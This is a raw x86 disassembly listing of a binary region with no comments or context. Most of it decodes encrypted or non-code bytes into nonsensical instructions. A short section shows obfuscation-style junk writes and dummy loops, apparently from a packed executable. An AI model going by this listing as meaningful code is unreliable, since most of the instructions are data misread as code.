  40d317:	mov    al,ds:0xe0f8b745
  40d31c:	cs cmp al,0x24
  40d31f:	xchg   ecx,eax
  40d320:	push   0x8bdb3350
  40d325:	aam    0x4a
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	ja     0x40d2c2
  40d33a:	dec    ebp
  40d33b:	scas   al,BYTE PTR es:[edi]
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	loopne 0x40d381
  40d346:	mov    ds:0x6959a31c,al
  40d34b:	ja     0x40d2e9
  40d34d:	leave  
  40d34e:	or     edi,DWORD PTR [eax-0x3a]
  40d351:	push   ebp
  40d352:	pop    ebx
  40d353:	xor    edx,DWORD PTR [esi]
  40d355:	jmp    0x40d34f
  40d357:	mov    ds:0xd204e17f,eax
  40d35c:	jl     0x40d343
  40d35e:	adc    ah,bh
  40d360:	pop    ss
  40d361:	or     DWORD PTR ds:0xd84ff6be,esp
  40d367:	lea    edx,[edi+esi*8-0x6c2cc0a6]
  40d36e:	int    0x3d
  40d370:	xchg   ebx,eax
  40d371:	pushf  
  40d372:	mov    edi,0x867c1ee4
  40d377:	and    al,bh
  40d379:	sbb    al,0xaa
  40d37b:	(bad)  
  40d37e:	stos   DWORD PTR es:[edi],eax
  40d37f:	cwde   
  40d380:	int    0x2d
  40d382:	lock test al,0xe8
  40d385:	mov    eax,ds:0xdd3e2ea5
  40d38a:	rcl    ecx,0xb6
  40d38d:	jle    0x40d367
  40d38f:	sub    eax,0x2ee34f16
  40d394:	mov    esi,0xa19697d1
  40d399:	ficomp WORD PTR [edx]
  40d39b:	test   eax,0x40b9e4c2
  40d3a0:	sub    ebp,DWORD PTR [ebp-0x34]
  40d3a3:	aas    
  40d3a4:	xchg   ebx,eax
  40d3a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3a6:	mov    WORD PTR [ebx-0x778cbd7f],ss
  40d3ac:	or     al,0x2c
  40d3ae:	ret    0x7f99
  40d3b1:	xlat   BYTE PTR ds:[ebx]
  40d3b2:	sbb    eax,0x6d457a3f
  40d3b7:	pop    ds
  40d3b8:	icebp  
  40d3b9:	call   0x34a3:0x621b4947
  40d3c0:	stos   DWORD PTR es:[edi],eax
  40d3c1:	and    al,0x81
  40d3c3:	add    ebx,DWORD PTR [eax-0x2d3887af]
  40d3c9:	xor    esp,ebx
  40d3cb:	dec    BYTE PTR [edx+0x85c086]
  40d3d1:	aas    
  40d3d2:	mov    BYTE PTR [eax],ah
  40d3d4:	inc    eax
  40d3d5:	outs   dx,DWORD PTR ds:[esi]
  40d3d6:	pop    ds
  40d3d7:	sbb    bl,dl
  40d3d9:	mov    ebp,0xf751e5dc
  40d3de:	in     al,0xc0
  40d3e0:	pop    es
  40d3e1:	push   esp
  40d3e2:	loope  0x40d3a7
  40d3e4:	push   es
  40d3e5:	mov    ecx,0xbad90761
  40d3ea:	stos   BYTE PTR es:[edi],al
  40d3eb:	xchg   ebp,eax
  40d3ec:	pop    eax
  40d3ed:	inc    esi
  40d3ee:	pop    ds
  40d3ef:	mov    bh,0x6b
  40d3f1:	mov    ds:0xa7886e48,eax
  40d3f6:	push   cs
  40d3f7:	sti    
  40d3f8:	cmp    al,0x25
  40d3fa:	mov    ch,0x3c
  40d3fc:	dec    ebp
  40d3fd:	mov    BYTE PTR ds:[esp+0x71],bl
  40d402:	lahf   
  40d403:	ins    DWORD PTR es:[edi],dx
  40d404:	ins    DWORD PTR es:[edi],dx
  40d405:	jne    0x40d3b4
  40d407:	add    esi,DWORD PTR [edx-0x2d0d280d]
  40d40d:	lds    ebx,FWORD PTR [ebp+0xa]
  40d410:	jp     0x40d476
  40d412:	(bad)  
  40d413:	xchg   BYTE PTR gs:[edx+0x72],al
  40d417:	xor    al,0x56
  40d419:	jb     0x40d3c6
  40d41b:	or     ch,bh
  40d41d:	cmp    al,0x27
  40d41f:	jmp    0x40d42a
  40d421:	and    DWORD PTR [esi-0x752c3460],ebp
  40d427:	xchg   esi,eax
  40d428:	push   ebp
  40d429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d42a:	mov    esp,0x6b977752
  40d42f:	rol    edx,0x38
  40d432:	into   
  40d433:	adc    eax,0xac439d4e
  40d438:	stos   DWORD PTR es:[edi],eax
  40d439:	jecxz  0x40d3d4
  40d43b:	cmc    
  40d43c:	xor    al,0xd1
  40d43e:	mov    ch,0x1b
  40d440:	sbb    edx,DWORD PTR [edx+0x180f5618]
  40d446:	cli    
  40d447:	ret    0x5e1
  40d44a:	rol    DWORD PTR [edx+0x9ab6638],1
  40d450:	jnp    0x40d47b
  40d452:	jnp    0x40d3e4
  40d454:	mov    dh,0xb4
  40d456:	jo     0x40d43a
  40d458:	in     al,dx
  40d459:	fld    TBYTE PTR [ebx]
  40d45b:	es sub dl,bl
  40d45e:	ret    0xcaae
  40d461:	sbb    al,0x1e
  40d463:	hlt    
  40d464:	or     edx,DWORD PTR [ebp+0x56d3c32f]
  40d46a:	lods   al,BYTE PTR ds:[esi]
  40d46b:	inc    esp
  40d46c:	daa    
  40d46d:	sub    DWORD PTR [edi],eax
  40d46f:	sahf   
  40d470:	mul    BYTE PTR ds:[ecx-0x527a2c94]
  40d477:	mov    ds:0x27c70358,al
  40d47c:	mov    ah,0x3e
  40d47e:	push   ebp
  40d47f:	addr16 jns 0x40d4db
  40d482:	mov    ebp,0x62b8f14e
  40d487:	sub    al,0x36
  40d489:	shl    BYTE PTR [ecx],cl
  40d48b:	add    BYTE PTR [edi+0xa94256a],ch
  40d491:	dec    esi
  40d492:	push   ds
  40d493:	retf   0x62e2
  40d496:	mov    edx,DWORD PTR [ebx]
  40d498:	test   al,0x49
  40d49a:	or     al,BYTE PTR [edx]
  40d49c:	jl     0x40d4da
  40d49e:	mov    dh,0x80
  40d4a0:	jmp    0x40d4f6
  40d4a2:	lea    esp,[esi]
  40d4a4:	dec    edx
  40d4a5:	mov    dh,0xc6
  40d4a7:	int3   
  40d4a8:	add    esp,DWORD PTR [eax+eiz*2+0x1a]
  40d4ac:	in     al,dx
  40d4ad:	sub    esi,ecx
  40d4af:	mov    ds:0xc87484b3,al
  40d4b4:	test   eax,0xbc224659
  40d4b9:	popa   
  40d4ba:	jle    0x40d4a0
  40d4bc:	cli    
  40d4bd:	sub    BYTE PTR ds:0x243db3f4,al
  40d4c3:	cmp    DWORD PTR [esi],eax
  40d4c5:	lahf   
  40d4c6:	gs popa 
  40d4c8:	fsubr  DWORD PTR [eax+0x1]
  40d4cb:	shl    BYTE PTR [edx+0x3816f3e6],cl
  40d4d1:	fimul  DWORD PTR [edx+0x20]
  40d4d4:	enter  0xfc81,0x33
  40d4d8:	shl    BYTE PTR [edi-0x49],1
  40d4db:	xchg   ecx,eax
  40d4dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4dd:	scas   al,BYTE PTR es:[edi]
  40d4de:	icebp  
  40d4df:	jmp    0x2f5e4e5a
  40d4e4:	mov    bh,0xc3
  40d4e6:	repnz xchg edi,eax
  40d4e8:	add    ecx,DWORD PTR [esi]
  40d4ea:	jge    0x40d496
  40d4ec:	cld    
  40d4ed:	pop    ebp
  40d4ee:	ror    BYTE PTR [ebx+0x3c],cl
  40d4f1:	jns    0x40d565
  40d4f3:	inc    ecx
  40d4f4:	push   ds
  40d4f5:	fs in  al,0xc6
  40d4f8:	dec    esp
  40d4f9:	xchg   edi,eax
  40d4fa:	xor    al,0xb5
  40d4fc:	adc    al,0x7f
  40d4fe:	les    esi,FWORD PTR [ecx]
  40d500:	xor    DWORD PTR ds:[ebp-0x4e],0xc3dd6447
  40d508:	icebp  
  40d509:	dec    esp
  40d50a:	push   ecx
  40d50b:	or     ch,BYTE PTR [esi-0x189bd9dd]
  40d511:	arpl   sp,di
  40d513:	dec    ebx
  40d514:	mov    dl,0xce
  40d516:	or     ch,BYTE PTR [esi-0x3a389ac8]
  40d51c:	sbb    cl,al
  40d51e:	inc    ecx
  40d51f:	call   0x82e4:0x538cd00c
  40d526:	sahf   
  40d527:	mov    bl,0x9b
  40d529:	mov    WORD PTR [ecx+0x699b3ac2],es
  40d52f:	inc    esi
  40d530:	sbb    dh,ch
  40d532:	js     0x40d5ae
  40d534:	dec    DWORD PTR [ecx]
  40d536:	inc    ebx
  40d537:	mov    eax,ds:0x9435bbcf
  40d53c:	or     eax,0xa32ec15b
  40d541:	xor    al,0x1d
  40d543:	and    ecx,DWORD PTR [ebx+0x4db794bc]
  40d549:	(bad)  [ebp+0x3ecf3659]
  40d54f:	sub    dl,BYTE PTR [ebp-0x20]
  40d552:	shl    DWORD PTR [eax+0x2779c3bd],1
  40d558:	stc    
  40d559:	push   es
  40d55a:	repz inc esi
  40d55c:	fild   WORD PTR [edx+0x7f]
  40d55f:	xor    BYTE PTR [edx+ebp*1],dl
  40d562:	loope  0x40d555
  40d564:	dec    esi
  40d565:	inc    esp
  40d566:	mov    edx,0xc300b7d0
  40d56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d56c:	mov    dh,0xe9
  40d56e:	mov    ecx,0xc8df9a18
  40d573:	push   ss
  40d574:	xor    edi,ebp
  40d576:	mov    al,0x4c
  40d578:	adc    DWORD PTR [eax+0x129550cb],eax
  40d57e:	cmc    
  40d57f:	fmul   DWORD PTR [ebp+0x18]
  40d582:	aad    0xe
  40d584:	xor    ch,dh
  40d586:	test   al,0x96
  40d588:	icebp  
  40d589:	mov    edx,0x1a1c0343
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xefa0482a
  40d6f9:	stos   DWORD PTR es:[edi],eax
  40d6fa:	jmp    ecx
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6d9
  40d705:	mov    ah,bh
  40d707:	mov    ah,0xcf
  40d709:	cmp    edi,DWORD PTR [eax-0x58e0eea8]
  40d70f:	mov    bh,dh
  40d711:	ins    BYTE PTR es:[edi],dx
  40d712:	aad    0x40
  40d714:	daa    
  40d715:	jne    0x40d728
  40d717:	enter  0x7b05,0x1d
  40d71b:	inc    eax
  40d71c:	xor    ch,cl
  40d71e:	sub    ecx,ecx
  40d720:	mov    ss,WORD PTR [edx]
  40d722:	jnp    0x40d769
  40d724:	jbe    0x40d779
  40d726:	pop    ss
  40d727:	(bad)  
  40d728:	jmp    0x659446cf
  40d72d:	xor    ah,ah
  40d72f:	cdq    
  40d730:	retf   0xfece
  40d733:	cs dec edx
  40d735:	inc    edi
  40d736:	pop    ds
  40d737:	xchg   ecx,eax
  40d738:	add    eax,esp
  40d73a:	push   edx
  40d73b:	shl    BYTE PTR [edi],0x71
  40d73e:	add    ebp,DWORD PTR [ebx-0x70fbc931]
  40d744:	mov    ebx,0xa77d812c
  40d749:	jne    0x40d6d5
  40d74b:	push   ecx
  40d74c:	addr16 and cl,ah
  40d74f:	push   esp
  40d750:	retf   0xa7d5
  40d753:	lock repnz cmp DWORD PTR [ebp+0x33ba8d7],0x36729744
  40d75f:	aaa    
  40d760:	clc    
  40d761:	inc    esi
  40d762:	cmp    al,0xf9
  40d764:	dec    ebp
  40d765:	push   0x493ac6fd
  40d76a:	ins    DWORD PTR es:[di],dx
  40d76c:	(bad)  
  40d76d:	hlt    
  40d76e:	in     al,0x32
  40d770:	xchg   edi,eax
  40d771:	cmp    al,0xf6
  40d773:	loop   0x40d799
  40d775:	out    dx,eax
  40d776:	ret    
  40d777:	mov    eax,ds:0x7d9f271
  40d77c:	cmp    bl,BYTE PTR [eax+0x3ea1c15c]
  40d782:	mov    eax,ds:0x6acd2a98
  40d787:	lock mov ah,0xd1
  40d78a:	cmp    DWORD PTR [eax+0x67],ebp
  40d78d:	add    al,0x1e
  40d78f:	mov    dl,0x4c
  40d791:	jbe    0x40d7b5
  40d793:	mov    ch,0x7a
  40d795:	dec    ebp
  40d796:	pop    ss
  40d797:	gs aas 
  40d799:	dec    edi
  40d79a:	jae    0x40d723
  40d79c:	xchg   ecx,eax
  40d79d:	xchg   edi,eax
  40d79e:	inc    ebp
  40d79f:	test   al,0xaa
  40d7a1:	pusha  
  40d7a2:	test   eax,0x6269975b
  40d7a7:	pop    ds
  40d7a8:	and    edi,esp
  40d7aa:	xchg   ebp,eax
  40d7ab:	pushf  
  40d7ac:	mov    esp,0x98aae6d7
  40d7b1:	div    BYTE PTR ds:0x25699c51
  40d7b7:	jb     0x40d832
  40d7b9:	(bad)  
  40d7ba:	popa   
  40d7bb:	stos   BYTE PTR es:[edi],al
  40d7bc:	mov    al,ds:0xb1516edf
  40d7c1:	or     al,0x63
  40d7c3:	loope  0x40d7ea
  40d7c5:	push   0x7a010369
  40d7ca:	pusha  
  40d7cb:	pop    ebx
  40d7cc:	ins    BYTE PTR es:[edi],dx
  40d7cd:	(bad)
  40d7d1:	sbb    al,0x9c
  40d7d3:	call   0x6335c04f
  40d7d8:	xor    DWORD PTR [ebp+0x72],0xda3ecda1
  40d7df:	cld    
  40d7e0:	mov    bl,0x3d
  40d7e2:	push   esi
  40d7e3:	pop    ebp
  40d7e4:	sbb    cl,BYTE PTR [eax]
  40d7e6:	jmp    0x5846:0x8492ed76
  40d7ed:	push   edx
  40d7ee:	lods   al,BYTE PTR ds:[esi]
  40d7ef:	popf   
  40d7f0:	div    ecx
  40d7f2:	cmp    edi,edi
  40d7f4:	xchg   ebp,eax
  40d7f5:	add    eax,0xfd026b82
  40d7fa:	sbb    BYTE PTR [eax],al
  40d7fc:	mov    ch,0xb8
  40d7fe:	ins    DWORD PTR es:[edi],dx
  40d7ff:	fbstp  TBYTE PTR [esi+0x45]
  40d802:	(bad)  
  40d803:	mov    edi,0x50035611
  40d808:	loop   0x40d873
  40d80a:	xchg   esp,esp
  40d80c:	repz push ebp
  40d80e:	cmp    DWORD PTR [eax+0x1d74d7d3],ecx
  40d814:	push   ecx
  40d815:	loopne 0x40d7fa
  40d817:	jbe    0x40d802
  40d819:	ins    BYTE PTR es:[edi],dx
  40d81a:	dec    ebp
  40d81b:	popa   
  40d81c:	pop    DWORD PTR [esi]
  40d81e:	pushf  
  40d81f:	dec    ebp
  40d820:	jg     0x40d81c
  40d822:	pop    esi
  40d823:	mov    dl,0xb4
  40d825:	mov    gs,WORD PTR [esi-0x52]
  40d828:	add    al,0xe5
  40d82a:	and    bl,BYTE PTR [edi+0x24866ace]
  40d830:	xchg   esp,eax
  40d831:	push   0x7f
  40d833:	loop   0x40d89a
  40d835:	rcl    esp,cl
  40d837:	stos   BYTE PTR es:[edi],al
  40d838:	mov    al,0x1b
  40d83a:	xor    ax,0xa482
  40d83e:	int3   
  40d83f:	dec    ecx
  40d840:	ins    BYTE PTR es:[edi],dx
  40d841:	in     al,dx
  40d842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d843:	push   eax
  40d844:	test   eax,0xbeef3103
  40d849:	add    BYTE PTR [ebp-0x5fe8824d],al
  40d84f:	xor    BYTE PTR [ecx+0x67c42a77],al
  40d855:	jl     0x40d7e1
  40d857:	jo     0x40d801
  40d859:	xchg   ebx,edx
  40d85b:	cmp    eax,0xd1b57196
  40d860:	lods   eax,DWORD PTR ds:[esi]
  40d861:	mov    edi,0xc25a137
  40d866:	dec    eax
  40d867:	scas   eax,DWORD PTR es:[edi]
  40d868:	mov    eax,0x657d80ad
  40d86d:	xor    BYTE PTR [ecx+0x25],dh
  40d870:	xor    al,0xee
  40d872:	popf   
  40d873:	pusha  
  40d874:	pop    eax
  40d875:	test   BYTE PTR [edx-0x80],cl
  40d878:	jl     0x40d86d
  40d87a:	call   0x73af2f3b
  40d87f:	int    0x80
  40d881:	mov    eax,ds:0x3161097b
  40d886:	fdivp  st(0),st
  40d888:	xor    cl,BYTE PTR [edi+0x61]
  40d88b:	aas    
  40d88c:	js     0x40d872
  40d88e:	push   0x1
  40d890:	arpl   WORD PTR [esi+0x39],sp
  40d893:	imul   BYTE PTR [ebp-0x350789a5]
  40d899:	and    eax,0x548d05d9
  40d89e:	jno    0x40d91e
  40d8a0:	nop
  40d8a1:	ins    DWORD PTR es:[edi],dx
  40d8a2:	fisttp WORD PTR [ecx-0x63db13cd]
  40d8a8:	mov    bh,0x3d
  40d8aa:	sub    edi,esi
  40d8ac:	mov    WORD PTR [ecx],es
  40d8ae:	retf   
  40d8af:	ds dec edi
  40d8b1:	loop   0x40d859
  40d8b3:	push   cs
  40d8b4:	inc    esi
  40d8b5:	jns    0x40d8b6
  40d8b7:	push   eax
  40d8b8:	in     al,0xd9
  40d8ba:	jns    0x40d897
  40d8bc:	in     al,0xf7
  40d8be:	call   0xbc9d5ec1
  40d8c3:	or     al,BYTE PTR [eax]
  40d8c5:	in     eax,dx
  40d8c6:	rcl    cl,cl
  40d8c8:	pop    ecx
  40d8c9:	cwde   
  40d8ca:	jg     0x40d84e
  40d8cc:	or     al,0x70
  40d8ce:	and    DWORD PTR [eax+ebp*2+0x45],edx
  40d8d2:	hlt    
  40d8d3:	lods   eax,DWORD PTR ds:[esi]
  40d8d4:	inc    ebp
  40d8d5:	shl    BYTE PTR [eax+eiz*4-0x3bcf167d],0x62
  40d8dd:	ds je  0x40d930
  40d8e0:	cli    
  40d8e1:	mov    edx,0xe045ddb
  40d8e6:	add    ebp,DWORD PTR [edx+0x66]
  40d8e9:	cld    
  40d8ea:	pushf  
  40d8eb:	ins    BYTE PTR es:[edi],dx
  40d8ec:	mov    DWORD PTR [eax-0x6fd9d57e],ecx
  40d8f2:	cs and dl,0x9e
  40d8f6:	imul   ebx,DWORD PTR [ebx+edx*8+0x64],0xb
  40d8fb:	jl     0x40d8b9
  40d8fd:	push   es
  40d8fe:	push   0x51f6ea29
  40d903:	mov    ch,0xee
  40d905:	dec    ebx
  40d906:	rcr    DWORD PTR [ebp-0x7df9a1ec],1
  40d90c:	xchg   edi,eax
  40d90d:	push   ss
  40d90e:	sbb    bl,BYTE PTR [edx+0x68]
  40d911:	call   0x3b16:0xf50a894
  40d918:	ret    
  40d919:	mov    ecx,0x89f9a129
  40d91e:	fbstp  TBYTE PTR [eax-0x52]
  40d921:	aaa    
  40d922:	xor    al,0x8f
  40d924:	and    dh,bh
  40d926:	lods   al,BYTE PTR ds:[esi]
  40d927:	pop    edi
  40d928:	ins    DWORD PTR es:[edi],dx
  40d929:	mov    eax,0xf85e3ee1
  40d92e:	sbb    BYTE PTR [ebp-0x5c4ad939],al
  40d934:	shl    DWORD PTR [edx-0x24],cl
  40d937:	outs   dx,DWORD PTR ds:[esi]
  40d938:	repnz out dx,eax
  40d93a:	scas   al,BYTE PTR es:[edi]
  40d93b:	adc    al,0xd5
  40d93d:	inc    ebp
  40d93e:	mov    dh,0x30
  40d940:	sbb    DWORD PTR [edi+0x1894c05],ecx
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x9e2b51ed
  40d96a:	inc    esi
  40d96b:	les    ebp,FWORD PTR [edx+edi*1]
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d96d
  40d976:	dec    ebx
  40d977:	add    dh,BYTE PTR [esi-0x71]
  40d97a:	sar    DWORD PTR [edi],cl
  40d97c:	dec    edi
  40d97d:	leave  
  40d97e:	push   ss
  40d97f:	mov    cl,0x4a
  40d981:	mov    ?,WORD PTR [eax+0x47]
  40d984:	mov    al,0xc6
  40d986:	clc    
  40d987:	jp     0x40d930
  40d989:	in     eax,0x41
  40d98b:	cmp    ch,BYTE PTR [edi-0x62]
  40d98e:	mov    dh,0xc3
  40d990:	or     BYTE PTR gs:[edi+0x31],al
  40d994:	adc    esp,DWORD PTR [esi+0x7d67dff0]
  40d99a:	rol    BYTE PTR [edi-0x7ae53f12],1
  40d9a0:	loop   0x40d928
  40d9a2:	mov    BYTE PTR [ecx],ch
  40d9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a5:	sub    al,0xa9
  40d9a7:	js     0x40d979
  40d9a9:	push   edi
  40d9aa:	std    
  40d9ab:	addr16 pop eax
  40d9ad:	ins    BYTE PTR es:[edi],dx
  40d9ae:	aas    
  40d9af:	(bad)  
  40d9b0:	push   0x75
  40d9b2:	inc    esi
  40d9b3:	cs push cs
  40d9b5:	aam    0x5b
  40d9b7:	(bad)  
  40d9b9:	xchg   ecx,eax
  40d9ba:	ja     0x40d995
  40d9bc:	(bad)  
  40d9be:	fwait
  40d9bf:	push   ecx
  40d9c1:	push   ebx
  40d9c2:	xlat   BYTE PTR ds:[ebx]
  40d9c3:	mov    ah,0x47
  40d9c5:	gs pop edi
  40d9c7:	int3   
  40d9c8:	popa   
  40d9c9:	cld    
  40d9ca:	mov    ecx,0xf66aec74
  40d9cf:	mov    DWORD PTR [eax-0x6c],esp
  40d9d2:	push   ebx
  40d9d3:	adc    eax,0xf21e173d
  40d9d8:	jle    0x40d97d
  40d9da:	adc    eax,0x976a05db
  40d9df:	fwait
  40d9e0:	leave  
  40d9e1:	hlt    
  40d9e2:	or     DWORD PTR [edx-0x2d861da9],eax
  40d9e8:	gs xchg esi,eax
  40d9ea:	ins    BYTE PTR es:[edi],dx
  40d9eb:	pop    ecx
  40d9ec:	push   ss
  40d9ed:	push   ss
  40d9ee:	pop    es
  40d9ef:	cmp    ecx,DWORD PTR [esp+edx*1+0x395674f]
  40d9f6:	mov    WORD PTR [esi+0xa],cs
  40d9f9:	inc    eax
  40d9fa:	mov    ebp,0x87fdd3dc
  40d9ff:	add    eax,0xea18dc32
  40da04:	leave  
  40da05:	push   ecx
  40da06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da07:	or     BYTE PTR [ecx],ch
  40da09:	leave  
  40da0a:	jnp    0x40d98c
  40da0c:	rcr    dh,cl
  40da0e:	add    al,0x8d
  40da10:	cmp    al,0xa2
  40da12:	stc    
  40da13:	out    0xb5,eax
  40da15:	xlat   BYTE PTR ds:[ebx]
  40da16:	and    ah,bl
  40da18:	shl    ah,cl
  40da1a:	in     al,dx
  40da1b:	bound  ebp,QWORD PTR [eax]
  40da1d:	jle    0x40d9df
  40da1f:	out    0x13,eax
  40da21:	leave  
  40da22:	fistp  QWORD PTR [ebx]
  40da24:	mov    ebp,0x5633dbed
  40da29:	jb     0x40d9f3
  40da2b:	push   esi
  40da2c:	bound  ecx,QWORD PTR [ebx]
  40da2e:	mov    cl,0x3d
  40da30:	mov    bl,0xfb
  40da32:	jnp    0x40da8b
  40da34:	cwde   
  40da35:	inc    edx
  40da36:	shl    BYTE PTR [esi+0x365879e5],1
  40da3c:	cli    
  40da3d:	loopne 0x40da1e
  40da3f:	mov    bl,0xeb
  40da41:	(bad)  
  40da42:	call   0x3b8b1a72
  40da47:	mov    esi,DWORD PTR [eax]
  40da49:	push   ebx
  40da4a:	sub    al,0x8
  40da4c:	mov    esi,0x5a5742fd
  40da51:	hlt    
  40da52:	sub    dl,al
  40da54:	int3   
  40da55:	or     al,bh
  40da57:	mov    ebp,0xdde55109
  40da5c:	sar    BYTE PTR [edi+ebp*8-0x34c6ec5],1
  40da63:	jns    0x40da29
  40da65:	push   ebp
  40da66:	repnz sub BYTE PTR [esi],ch
  40da69:	(bad)  
  40da6a:	sub    ebx,ecx
  40da6c:	outs   dx,WORD PTR fs:[esi]
  40da6f:	cwde   
  40da70:	fs cmc 
  40da72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da73:	out    dx,al
  40da74:	mov    dl,0xdc
  40da76:	scas   eax,DWORD PTR es:[edi]
  40da77:	adc    DWORD PTR [edx+0x51],esi
  40da7a:	daa    
  40da7b:	test   eax,0xc21dd8ec
  40da80:	xor    DWORD PTR [edx],0xc219d42d
  40da86:	adc    ecx,ebp
  40da88:	push   es
  40da89:	popa   
  40da8a:	push   edx
  40da8b:	mov    al,0x55
  40da8d:	test   eax,0x58e6f7f4
  40da92:	fdivr  QWORD PTR [ecx]
  40da94:	fwait
  40da95:	mov    ah,0x5a
  40da97:	lahf   
  40da98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da99:	sbb    DWORD PTR [ebx],esp
  40da9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da9c:	add    al,0xf8
  40da9e:	out    0x4d,eax
  40daa0:	test   eax,0xe3f5bc21
  40daa5:	leave  
  40daa6:	lock clc 
  40daa8:	in     eax,dx
  40daa9:	ins    BYTE PTR es:[edi],dx
  40daaa:	sub    BYTE PTR [ecx-0x317adfdf],0xa2
  40dab1:	xchg   ebx,eax
  40dab2:	cvtps2pd xmm1,QWORD PTR [esi+0x4a]
  40dab6:	jg     0x40da64
  40dab8:	mov    bh,0xfc
  40daba:	xchg   ebx,eax
  40dabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dabc:	push   ecx
  40dabd:	mov    es,WORD PTR [eax-0x4d88439c]
  40dac3:	cmp    DWORD PTR [ecx+0x2047c71c],ebp
  40dac9:	scas   al,BYTE PTR es:[edi]
  40daca:	leave  
  40dacb:	jmp    0xe9f12cea
  40dad0:	(bad)  
  40dad1:	cmp    dl,BYTE PTR [ebx-0x1c577b18]
  40dad7:	xor    ch,BYTE PTR [edi-0x14]
  40dada:	inc    esi
  40dadb:	and    BYTE PTR [ebx+0x7b5ed21],ah
  40dae1:	sahf   
  40dae2:	aaa    
  40dae3:	push   ebp
  40dae4:	pop    ds
  40dae5:	dec    edx
  40dae6:	lahf   
  40dae7:	test   BYTE PTR [ecx-0x31df1f5d],dl
  40daed:	jae    0x40daae
  40daef:	push   cs
  40daf0:	popf   
  40daf1:	fbld   TBYTE PTR [esi+0x78455cfd]
  40daf7:	into   
  40daf8:	adc    al,0xa
  40dafa:	addr16 lahf 
